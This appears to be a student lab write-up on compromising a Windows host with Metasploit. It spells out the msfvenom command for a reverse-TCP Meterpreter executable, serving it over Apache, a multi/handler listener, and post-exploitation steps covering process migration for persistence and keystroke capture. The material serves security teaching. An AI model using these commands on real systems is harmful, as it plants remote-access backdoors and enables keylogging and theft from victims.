# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![272766127-738403cb-ddf8-4e5f-af5b-50f6531673bc](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/717b44c9-2edc-4d46-bb50-ea5e876cdefe)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![272766170-57c1fa09-ae80-401b-8422-41213b252aee](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/c6850938-33ef-40aa-b2c9-fd906a86756a)

copy the fun.exe into the apache /var/www/html folder
![272766196-379bf937-8d1d-47ca-9ca3-9dc95c1c0db5](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/bc4778de-e298-474f-b2c1-047de52053a8)

Start apache server
sudo systemctl apache2 start
![272766234-2a8aefe2-4668-467c-a3af-57a346f5d9da](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/8e51a702-2528-417e-8c0a-4df26fa61b97)

Check the status of apache2
![272766264-e9323521-d25e-4418-a86b-66c9d872a4dd](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/3c058ea9-f43c-4cb5-9204-360f6cd44238)

Invoke msfconsole:
## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![272766362-08007393-8ae5-4095-a288-688b21b6654c](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/c77dbe89-7bd0-4112-8447-96e2c234bbe0)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![272766389-a5afa68b-3991-4c94-a8d2-2f4c22bb656d](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/2778106b-9879-4dea-af31-2e67f7627a32)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![272766409-6803b629-2f0b-46b6-a1b1-37333b5fa25e](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/29e25d04-ae83-45ad-a1c7-3441d6cc17f3)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![272766448-c379f00d-1be8-4a25-8342-25ff9208cb8d](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/790504ad-7ac6-417f-9868-150576509d9a)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![272766484-b245228d-be3b-418f-8a4d-f0aeb3277dd1](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/908d7782-832c-4463-97f4-63ee630d5250)

keyscan_dump	Shows the keystrokes captured so far
![272766502-bd229a9d-ec46-4590-a561-d81cca631f57](https://github.com/Aakash0407/Compromising-windows-using-Metasploit/assets/118799103/97ab39db-3a8c-484e-a233-99537cca387a)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
